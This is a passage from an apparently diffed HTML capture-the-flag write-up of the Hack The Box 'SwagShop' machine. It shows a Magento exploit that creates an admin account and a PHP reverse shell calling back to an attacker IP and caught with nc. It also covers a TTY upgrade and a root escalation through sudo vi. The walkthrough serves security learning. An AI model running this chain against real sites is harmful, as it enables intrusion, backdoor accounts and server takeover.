+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data={<span style="color:#3ad900;font-weight:400">"___directive"</span>:&nbsp;<span style="color:#3ad900;font-weight:400">"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"filter"</span>:&nbsp;base64.b64encode(pfilter),<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"forwarded"</span>:&nbsp;<span style="color:#ff0044;font-weight:400">1</span>})<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;r.ok:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"WORKED"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Check&nbsp;{0}/admin&nbsp;with&nbsp;creds&nbsp;forme:forme"</span>.format(target)<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"DID&nbsp;NOT&nbsp;WORK"</span><br>
+            </div>
+        </div><br>
+        <br>
+        Run it and you should be informed that it WORKED.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop/80http/exploits#&nbsp;python&nbsp;37977.py<br>
+                WORKED<br>
+                Check&nbsp;http://10.10.10.140/index.php/admin&nbsp;with&nbsp;creds&nbsp;forme:forme
+            </div>
+        </div><br>
+        <br>
+        Go check that it really has worked by logging in at <code>http://10.10.10.140/index.php/admin</code><br>
+        username: <code>forme</code><br>
+        password: <code>forme</code><br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Nice :)<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Gaining access</strong></h2><br>
+        First prep the php shell you're going to use. I'm using pentestmonkey's php-reverse-shell.<br>
+        Edit the IP to that of your attacking machine and set the port to whatever you'll be listening on.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop/80http/exploits#&nbsp;nano&nbsp;php-reverse-shell.php&nbsp;<br>
+                ...<br>
+                //&nbsp;Usage<br>
+                //&nbsp;-----<br>
+                //&nbsp;See&nbsp;http://pentestmonkey.net/tools/php-reverse-shell&nbsp;if&nbsp;you&nbsp;get&nbsp;stuck.<br>
+                <br>
+                set_time_limit&nbsp;(0);<br>
+                $VERSION&nbsp;=&nbsp;"1.0";<br>
+                $ip&nbsp;=&nbsp;'10.10.14.11';&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $port&nbsp;=&nbsp;9001;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $chunk_size&nbsp;=&nbsp;1400;<br>
+                $write_a&nbsp;=&nbsp;null;<br>
+                $error_a&nbsp;=&nbsp;null;<br>
+                $shell&nbsp;=&nbsp;'uname&nbsp;-a;&nbsp;w;&nbsp;id;&nbsp;/bin/sh&nbsp;-i';<br>
+                $daemon&nbsp;=&nbsp;0;<br>
+                $debug&nbsp;=&nbsp;0;<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>3a) Upload Plugin and Modify .php file</strong></h3><br>
+        To get a shell via the Magento Admin Panel we need to modify a <code>.php</code> file.<br>
+        In order to modify a <code>.php</code> file we need the <em>Filesystem</em> plugin, which currently isn't installed.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <strong>Upload</strong> <em><strong>Filesystem</strong></em> <strong>plugin</strong><br>
+        1) Go to Magento Connect Manager - <code>http://10.10.10.140/downloader</code> - and log in using the <code>forme / forme</code> credentials<br>
+        2) Upload the filesystem plugin - <a href="https://pluginarchive.com/magento/magpleasure_filesystem">https://pluginarchive.com/magento/magpleasure_filesystem</a><br>
+        <br>
+        <strong>Modify.php file</strong><br>
+        3) Go to the Magento Admin Panel - <code>http://10.10.10.140/index.php/admin</code><br>
+        4) The <em>Filesystem</em> plugin should now be there.<br>
+        Navigate to System tab &gt; Filesystem &gt; IDE<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        5) Pick a <code>.php</code> file to edit and copy/paste in your reverse shell, replacing the code that's already there.<br>
+        Make sure the file is publicly accessible (don't use index.php and ruin the box for others).<br>
+        I chose <code>/install.php</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        6) Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop/80http/exploits#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        7) And access the .php file you edited on the website to trigger your reverse shell.<br>
+        In my case, I visited - <code>http://10.10.10.140/install.php</code><br>
+        <br>
+        You should receive a shell on your listener!<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.140]&nbsp;57900<br>
+                Linux&nbsp;swagshop&nbsp;4.4.0-146-generic&nbsp;#172-Ubuntu&nbsp;SMP&nbsp;Wed&nbsp;Apr&nbsp;3&nbsp;09:00:08&nbsp;UTC&nbsp;2019&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux<br>
+                &nbsp;14:10:23&nbsp;up&nbsp;&nbsp;5:58,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.45<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                uid=33(www-data)&nbsp;gid=33(www-data)&nbsp;groups=33(www-data)<br>
+                /bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;whoami<br>
+                www-data<br>
+                $&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Go grab the user flag :)<br>
+            <div class="codebox">
+                $&nbsp;ls&nbsp;/home<br>
+                haris<br>
+                $&nbsp;cd&nbsp;/home/haris<br>
+                $&nbsp;ls<br>
+                user.txt<br>
+                $&nbsp;cat&nbsp;user.txt<br>
+                a448...
+            </div>
+        </div><br>
+        <br>
+        In my research of Magento I found (I think) multiple different ways to get shells via the admin panel. This is just the method that I used.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Priv-Esc</strong></h2><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>4a) Upgrade to interactive tty</strong></h3><br>
+        Upgrade your shell to an interactive tty. You'll need it.<br>
+        <br>
+        Spawn an interactive bash shell using python.<br>
+            <div class="codebox">
+                $&nbsp;python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                /bin/sh:&nbsp;14:&nbsp;python:&nbsp;not&nbsp;found<br>
+                $&nbsp;which&nbsp;python<br>
+                $<br>
+            </div>
+        </div><br>
+        <br>
+        Didn't work :/<br>
+        Python 2 isn't available on the system, but Python 3 is.<br>
+        Spawn an interactive shell using python3 instead.<br>
+            <div class="codebox">
+                $&nbsp;which&nbsp;python3<br>
+                /usr/bin/python3<br>
+                $&nbsp;python3&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                www-data@swagshop:/$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>4b) /etc/sudoers</strong></h3><br>
+        Have a read of /etc/sudoers and check which users might have sudo permissions.<br>
+            <div class="codebox">
+                www-data@swagshop:/$&nbsp;cat&nbsp;/etc/sudoers<br>
+                #<br>
+                #&nbsp;This&nbsp;file&nbsp;MUST&nbsp;be&nbsp;edited&nbsp;with&nbsp;the&nbsp;'visudo'&nbsp;command&nbsp;as&nbsp;root.<br>
+                ...<br>
+                www-data&nbsp;ALL=NOPASSWD:/usr/bin/vi&nbsp;/var/www/html/*
+            </div>
+        </div><br>
+        <br>
+        It appears that <code>www-data</code> has the permissions to run <code>vi</code> using <code>sudo</code>.<br>
+        • <code>sudo</code> stands for <em>'superuser do'</em> and is a command-line function that lets you run files/commands with superuser permissions i.e. root permissions<br>
+        • <code>vi</code> is an old school text editor<br>
+        <br>
+        This ability is of use to us because whilst in Vi we can escape to a shell.<br>
+        If Vi is running as root, we'll escape into a root shell.<br>
+        <br>
+        This line in <code>/etc/sudoers</code>:<br>
+        <code>www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*</code><br>
+        means:<br>
+        <em>www-data can run the</em> <em><code>vi</code></em> <em>binary with</em> <em><code>sudo</code></em> <em>permissions from ALL terminals without providing a password as long as they're editing any file within</em> <em><code>/var/www/html/&lt;file&gt;</code></em><br>
+        <br>
+        As a result, if we run <code>vi</code> using <code>sudo</code> and open any file in <code>/var/www/html/&lt;file&gt;</code> we'll have a Vi session running as root and have the opportunity to escape to a root shell. I chose to edit <code>/var/www/html/cron.sh</code> (no particular reason).<br>
+        <br>
+            <div class="codebox">
+                www-data@swagshop:/$&nbsp;ls&nbsp;-l&nbsp;/var/www/html/<br>
+                ls&nbsp;-l&nbsp;/var/www/html/<br>
+                total&nbsp;700<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;10679&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;LICENSE.html<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;10410&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;LICENSE.txt<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;10421&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;LICENSE_AFL.txt<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;585086&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;RELEASE_NOTES.txt<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;&nbsp;2834&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;api.php<br>
+                drwxr-xr-x&nbsp;&nbsp;6&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;&nbsp;4096&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;app<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;&nbsp;2831&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;cron.php<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;&nbsp;&nbsp;&nbsp;717&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2014&nbsp;cron.sh<br>
+                ...<br>
+                www-data@swagshop:/$&nbsp;sudo&nbsp;/usr/bin/vi&nbsp;/var/www/html/cron.sh
+            </div>
+        </div><br>
+        <br>
+        A Vi session will start:<br>
+            <div class="codebox">
+                #!/bin/sh<br>
+                #&nbsp;location&nbsp;of&nbsp;the&nbsp;php&nbsp;binary<br>
+                if&nbsp;[&nbsp;!&nbsp;"$1"&nbsp;=&nbsp;""&nbsp;]&nbsp;;&nbsp;then<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;CRONSCRIPT=$1<br>
+                else<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;CRONSCRIPT=cron.php<br>
+                fi<br>
+                <br>
+                MODE=""<br>
+                if&nbsp;[&nbsp;!&nbsp;"$2"&nbsp;=&nbsp;""&nbsp;]&nbsp;;&nbsp;then<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MODE="&nbsp;$2"<br>
+                fi<br>
+                <br>
+                PHP_BIN=`which&nbsp;php`<br>
+                <br>
+                #&nbsp;absolute&nbsp;path&nbsp;to&nbsp;magento&nbsp;installation<br>
+                INSTALLDIR=`echo&nbsp;$0&nbsp;|&nbsp;sed&nbsp;'s/cron\.sh//g'`<br>
+                <br>
+                #&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prepend&nbsp;the&nbsp;intallation&nbsp;path&nbsp;if&nbsp;not&nbsp;given&nbsp;an&nbsp;absolute&nbsp;path<br>
+                if&nbsp;[&nbsp;"$INSTALLDIR"&nbsp;!=&nbsp;""&nbsp;-a&nbsp;"`expr&nbsp;index&nbsp;$CRONSCRIPT&nbsp;/`"&nbsp;!=&nbsp;"1"&nbsp;];then<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;!&nbsp;ps&nbsp;auxwww&nbsp;|&nbsp;grep&nbsp;"$INSTALLDIR$CRONSCRIPT$MODE"&nbsp;|&nbsp;grep&nbsp;-v&nbsp;grep&nbsp;1&gt;/dev/nu<br>
+                ll&nbsp;2&gt;/dev/null&nbsp;;&nbsp;then<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$PHP_BIN&nbsp;$INSTALLDIR$CRONSCRIPT$MODE&nbsp;&amp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Top
+            </div>
+        </div><br>
+        <br>
+        To escape to a shell, just type - <code>:shell</code><br>
+        Since our initial reverse shell is php, the Vi window will be a little messed up. When I typed <code>:shell</code> it printed over the top of the text that was already there. That doesn't matter, it's just the shell window being funny.<br>
+        <br>
+        Press enter to run it.<br>
+        <br>
+        You should be in a root shell!<br>
+        Read the flag and you'll be presented with the opportunity to grab some swag :)<br>
+        <br>
+        For other shell-escape techniques using Vi you can have a look here - <a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a><br>
+        <br>
+            <div class="codebox">
+                root@swagshop:/#&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                root@swagshop:/#&nbsp;cd&nbsp;~<br>
+                root@swagshop:~#&nbsp;cat&nbsp;root.txt<br>
+                c2b08...<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;___&nbsp;___<br>
+                &nbsp;/|&nbsp;|/|\|&nbsp;|\<br>
+                /_|&nbsp;´&nbsp;|.`&nbsp;|_\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;We&nbsp;are&nbsp;open!&nbsp;(Almost)<br>
+                &nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;|.&nbsp;&nbsp;|<br>
+                &nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;|.&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Join&nbsp;the&nbsp;beta&nbsp;HTB&nbsp;Swag&nbsp;Store!<br>
+                &nbsp;&nbsp;|___|.__|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://hackthebox.store/password<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PS:&nbsp;Use&nbsp;root&nbsp;flag&nbsp;as&nbsp;password!
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
